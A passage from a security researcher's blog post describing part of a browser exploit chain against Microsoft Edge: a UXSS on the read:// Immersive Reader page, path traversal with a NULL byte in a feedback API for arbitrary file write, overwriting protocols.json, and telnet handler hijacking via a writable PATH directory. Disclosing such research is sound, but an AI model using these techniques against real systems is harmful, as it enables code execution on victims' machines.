class="built_in">GetOriginOrPrecursorOriginIfOpaque</span>()</span><br><span class="line">              -&gt;<span class="built_in">Protocol</span>())) &#123;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// [...]</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><em>↓ <strong>Path:</strong> <a target="_blank" rel="noopener" href="https://source.chromium.org/chromium/chromium/src/+/refs/tags/148.0.7778.97:third_party/blink/renderer/platform/weborigin/scheme_registry.cc">chromium&#x2F;third_party&#x2F;blink&#x2F;renderer&#x2F;platform&#x2F;weborigin&#x2F;scheme_registry.cc</a></em></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">bool</span> <span class="title">SchemeRegistry::ShouldTreatURLSchemeAsNotAllowingJavascriptURLs</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    <span class="type">const</span> String&amp; scheme)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">DCHECK_EQ</span>(scheme, scheme.<span class="built_in">LowerASCII</span>());</span><br><span class="line">  <span class="keyword">if</span> (scheme.<span class="built_in">empty</span>())</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">GetURLSchemesRegistry</span>().not_allowing_javascript_urls_schemes.<span class="built_in">Contains</span>(</span><br><span class="line">      scheme);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Basically, Chromium has put every privileged WebUI you can think of on the <code>not_allowing_javascript_urls_schemes</code> blacklist. So at that point, I still got stuck for a long while. 😖 </p>
+<h2 id="Arbitrary-File-Write-via-Immersive-Reader"><a href="#Arbitrary-File-Write-via-Immersive-Reader" class="headerlink" title="Arbitrary File Write via Immersive Reader"></a>Arbitrary File Write via Immersive Reader</h2><p>However, as we continued exploring Microsoft Edge, we found that Edge had its own Reading Mode called <a target="_blank" rel="noopener" href="https://support.microsoft.com/en-us/education/learning-accelerators/use-immersive-reader-in-microsoft-edge-1">Immersive Reader</a>. And unlike Chrome’s built-in Reading Mode, Immersive Reader seems to have been forked from Chromium early on, with Microsoft building on top of it. So instead of the old <code>chrome-distiller://</code> or the blacklisted <code>chrome-untrusted://</code>, Edge uses a custom <code>read://</code> scheme. And Microsoft seems to have forgotten to add this scheme to the blacklist as well, so our UXSS works on this privileged WebUI :)</p>
+<p>Starting from this privileged WebUI, we can access lots of native C++ objects through JavaScript. And one of them called <code>chrome.edgeFeedbackPrivate.zipDiagnosticLogFiles()</code> looked particularly interesting to me. We tried it out, and found that the function takes two parameters, a filename and a JSON string:</p>
+<p><em>↓ We ran this on <code>read://https_orange.tw/?url=https://orange.tw</code></em></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">chrome.<span class="property">edgeFeedbackPrivate</span>.<span class="title function_">zipDiagnosticLogFiles</span>(</span><br><span class="line">    <span class="string">&#x27;LOL.ZIP&#x27;</span>, </span><br><span class="line">    <span class="string">&#x27;&#123;</span></span><br><span class="line"><span class="string">        &quot;logFiles&quot;: &#123;</span></span><br><span class="line"><span class="string">            &quot;ORANGE&quot;: &quot;AAAAAAAA&quot;</span></span><br><span class="line"><span class="string">        &#125;, </span></span><br><span class="line"><span class="string">        &quot;deviceInfo&quot;: &#123;1337: 1337&#125;</span></span><br><span class="line"><span class="string">    &#125;&#x27;</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>
+
+<p>While playing with it, we observed that Microsoft Edge would first create a temporary folder and write <code>AAAAAAAA</code> to the file <code>ORANGE.json</code>. It would then pack the whole folder into <code>LOL.ZIP</code>, upload it to a Microsoft server, and clean everything up afterward. Of course, you’d want to try <code>../</code>… Yes, it does let you escape the temporary folder. But that <code>.json</code> extension is still a bit annoying. Maybe you’re also wondering if a NULL Byte could get rid of it… Of course it can! So now we have an arbitrary file write that can control both the filename and the content, and we can overwrite any file anywhere we want! </p>
+<p>Thank you again and again, Microsoft!</p>
+<p><img src="/posts/2026-10-the-last-proof-of-human-craft-browser-full-chain/a_slide1_smooth.svg" alt="a_slide1_smooth" title="w80"></p>
+<br>
+
+
+<h2 id="Overwriting-protocols-json-to-Auto-Launch-Protocol-Handlers"><a href="#Overwriting-protocols-json-to-Auto-Launch-Protocol-Handlers" class="headerlink" title="Overwriting protocols.json to Auto-Launch Protocol Handlers"></a>Overwriting <code>protocols.json</code> to Auto-Launch Protocol Handlers</h2><p>Now, we’ve got almost all the pieces. The last step is figuring out how to turn a browser-level arbitrary file write into ACE to complete the chain. We observed that Microsoft Edge would do some interesting side-loading while initializing, such as reading a bunch of config files or loading DLLs from a writable folder. </p>
+<p>So the DLL side-loading sounds juicy. However, since our file write is wrapped in JSON, the content has to be a valid UTF-8 string. And because Microsoft Edge is a 64-bit process, we’d have to drop a 64-bit DLL, too. After spending some time working on this, we found that we couldn’t construct a valid 64-bit PE header that met the UTF-8 requirement in any case, so we gave up on DLL side-loading.</p>
+<p>We ended up solving this in a less obvious way. We found that besides OneAuth, Edge also loads a bunch of components while initializing, and one of them is “AutoLaunchProtocolsComponent”. The component would read a configuration file called <code>protocols.json</code> from a folder we can write to, and that file defines which origins are allowed to launch which URL protocol handlers. So by overwriting the file, we can launch any protocol handler from any origin.</p>
+<p><em>↓ <strong>Path:</strong> Edge\User Data\AutoLaunchProtocolsComponent\1.0.0.10\protocols.json</em></p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;allow&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;origins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;https://.get.microsoft.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://.apps.microsoft.com&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ms-windows-store&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#123;</span></span><br><span class="line">      <span class="attr">&quot;origins&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;https://.onedrive.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://.onedrive.live.com&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="string">&quot;https://sharepoint.com&quot;</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      <span class="attr">&quot;protocol&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ms-word&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;warn&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">  <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;block&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">    <span class="comment">// [...]</span></span><br><span class="line">  <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>As for how do we get Microsoft Edge to re-initialize? Just use our earlier browser-initiated navigation to jump to <code>edge://restart</code>! :)</p>
+<h2 id="From-telnet-to-Code-Execution"><a href="#From-telnet-to-Code-Execution" class="headerlink" title="From telnet:// to Code Execution!"></a>From <code>telnet://</code> to Code Execution!</h2><p>Here we chose <code>telnet://</code> to get code execution. On Windows, the telnet handler would try to invoke <code>telnet.exe</code>, but the binary isn’t shipped by default, so Windows goes looking for it in the directories listed in the PATH environment variable. And one of those directories just happens to be writable by us…</p>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">C:\WINDOWS\system32</span><br><span class="line">C:\WINDOWS</span><br><span class="line">C:\WINDOWS\System32\Wbem</span><br><span class="line">C:\WINDOWS\System32\WindowsPowerShell\v1.<span class="number">0</span></span><br><span class="line">C:\WINDOWS\System32\OpenSSH</span><br><span class="line">C:\Users\lowpriv\AppData\Local\Microsoft\WindowsApps    <span class="comment"># &lt;--- it&#x27;s writable for `lowpriv`...</span></span><br></pre></td></tr></table></figure>
+
+<p>So by simply dropping a modified <code>protocols.json</code> and a 32-bit tiny PE, we got ACE. The whole exploit is less than 100 lines of code. The restart isn’t really necessary in a real attack, only for Pwn2Own. Let’s check out the demo! 🔥 </p>
+<iframe width="560" height="315" src="https://www.youtube.com/embed/oZRT-8U0l1c?si=Ky7dHon9t65oyu3Q&amp;controls=0" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+
+<br>
+
+<h1 id="Final-Thoughts"><a href="#Final-Thoughts" class="headerlink" title="Final Thoughts"></a>Final Thoughts</h1><p>From zero experience with modern browser exploitation to completing the full chain, the whole research took me two full months, with no LLMs&#x2F;AI involved at all. But why, you might ask? Perhaps because it sounds cool, or maybe it was also just good timing — I only started using coding agents like Codex and Claude Code around March this year, and by then, I’d already found all the bugs and done the hard part ¯\_(ツ)_&#x2F;¯</p>
+<p>So what’s the hard part? For memory corruption, it’s often the exploitation. But we’re playing with logic bugs, where the hard part is finding them, and once you find them all, chaining is the easiest part. So that’s also why I kept the whole exploit AI-free.</p>
+<p>Apart from that, I also see the UXSS primitive as a new attack surface, and agree that in the AI era, “<a target="_blank" rel="noopener" href="https://x.com/steventseeley/status/2035096238178410582">Attack Surface is the new 0day</a>“. I wanted to explore this gold mine more before sharing it with the AI giants. That’s another reason why I decided not to use AI on this chain.</p>
+<p>Of course, I’m not some old-fashioned guy who refuses to try new things, either. Outside of this chain, I’m also tokenmaxxing and addicted to AI. I believe once you’ve tasted how convenient LLMs are, no one would want to go back to hunting bugs by hand. That’s also the future, I think. </p>
+<p>I’m also not that afraid of being replaced by AI. I’d rather say it’s precisely because of AI, I finally have enough time to finish all the cool stuff that’s been sitting on my TODO list… like the Windows RCE <a target="_blank" rel="noopener" href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2026-58608">I just reported</a>, flipping the chain to <a target="_blank" rel="noopener" href="https://youtu.be/Bh1zglq4mLE">pop Microsoft Edge from <code>calc.exe</code></a>, or porting this logic-only full chain to Google Chrome (almost there &gt;&lt;). I’ll also show some progress at <a target="_blank" rel="noopener" href="https://codeblue.jp/en/program/time-table/day1-t1-08-origin-we-trust/">CODE BLUE</a> in Japan next month. Stay tuned! 😉</p>
+<p>So instead of worrying about how low the bar for vuln research can go, why not get excited about how high AI can take us? What fun can we have, what even cooler hacks can we build, and what impossible things can we make happen…? </p>
+<br>
+
+<p>Never Stop Exploiting!</p>
+<style>
+img[title="w60"] {
+    width: 60%;
+}
+
+img[title="w80"] {
+    width: 80%;
+}
+
+.twitter-tweet {
+  color: black !important;
+}
+</style><!-- flag of hidden posts -->
+  </div>
+</article>
+
+
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2009-2026
+    Orange Tsai
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/articles/">Articles</a></li><!--
+     --><!--
+       --><li><a href="/talks/">Talks</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
